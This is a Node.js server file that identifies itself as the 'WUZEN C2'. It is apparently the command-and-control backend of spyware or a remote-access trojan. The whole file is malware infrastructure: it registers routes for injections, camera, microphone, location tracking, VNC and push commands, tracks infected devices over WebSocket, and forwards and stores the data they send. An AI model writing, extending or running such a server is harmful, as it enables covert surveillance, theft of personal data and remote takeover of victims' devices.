import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import { createServer } from 'http';
import { WebSocketServer } from 'ws';
import { PORT } from './config.js';
import { initDB } from './models/Device.js';
import authRoutes from './routes/auth.js';
import deviceRoutes from './routes/devices.js';
import logRoutes from './routes/logs.js';
import injectionRoutes from './routes/injections.js';
import toolkitRoutes from './routes/toolkit.js';
import cameraRoutes from './routes/camera.js';
import microphoneRoutes from './routes/microphone.js';
import locationRoutes from './routes/location.js';
import vncRoutes from './routes/vnc.js';
import pushRoutes from './routes/push.js';
import { authMiddleware } from './middleware/auth.js';

const app = express();
const server = createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*', credentials: true }));
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 200 }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

initDB();

// Global state
const connectedDevices = new Map();
const activeStreams = new Map();

// WebSocket
wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);
  const deviceId = url.searchParams.get('deviceId');
  const token = url.searchParams.get('token');
  const isDashboard = url.searchParams.get('dashboard') === 'true';

  ws.isDashboard = isDashboard;
  ws.deviceId = deviceId;

  if (deviceId && !isDashboard) {
    connectedDevices.set(deviceId, { ws, lastPing: Date.now() });
    import('./models/Device.js').then(m => m.updateDeviceStatus(deviceId, 'online'));
  }

  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data);
      handleMessage(ws, msg, deviceId, isDashboard);
    } catch (e) { console.error('WS parse error:', e.message); }
  });

  ws.on('close', () => {
    if (deviceId) {
      connectedDevices.delete(deviceId);
      activeStreams.delete(deviceId);
      import('./models/Device.js').then(m => m.updateDeviceStatus(deviceId, 'offline'));
    }
  });

  ws.on('error', (err) => console.error('WS error:', err.message));

  if (!isDashboard && deviceId) {
    ws.send(JSON.stringify({ type: 'config', payload: { heartbeatInterval: 30000 } }));
  }
});

function handleMessage(ws, msg, deviceId, isDashboard) {
  if (msg.type === 'ping') {
    const dev = connectedDevices.get(deviceId);
    if (dev) dev.lastPing = Date.now();
    ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
    return;
  }

  if (!isDashboard) {
    // Forward device data to dashboards
    wss.clients.forEach(client => {
      if (client.readyState === 1 && client.isDashboard) {
        client.send(JSON.stringify({ event: msg.type, deviceId, data: msg.data || msg }));
      }
    });

    // Store in DB
    if (msg.type && msg.data) {
      import('./models/Log.js').then(m => m.addLog(deviceId, msg.type, msg.data));
    }
  }
}

// Heartbeat cleanup
setInterval(() => {
  const now = Date.now();
  for (const [id, dev] of connectedDevices) {
    if (now - dev.lastPing > 120000) {
      dev.ws.terminate();
      connectedDevices.delete(id);
      import('./models/Device.js').then(m => m.updateDeviceStatus(id, 'offline'));
    }
  }
}, 30000);

// Expose to routes
app.locals.connectedDevices = connectedDevices;
app.locals.activeStreams = activeStreams;
app.locals.wss = wss;

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/devices', authMiddleware, deviceRoutes);
app.use('/api/logs', authMiddleware, logRoutes);
app.use('/api/injections', authMiddleware, injectionRoutes);
app.use('/api/toolkit', authMiddleware, toolkitRoutes);
app.use('/api/camera', authMiddleware, cameraRoutes);
app.use('/api/microphone', authMiddleware, microphoneRoutes);
app.use('/api/location', authMiddleware, locationRoutes);
app.use('/api/vnc', authMiddleware, vncRoutes);
app.use('/api/push', authMiddleware, pushRoutes);

server.listen(PORT, () => console.log(`WUZEN C2 on port ${PORT}`));
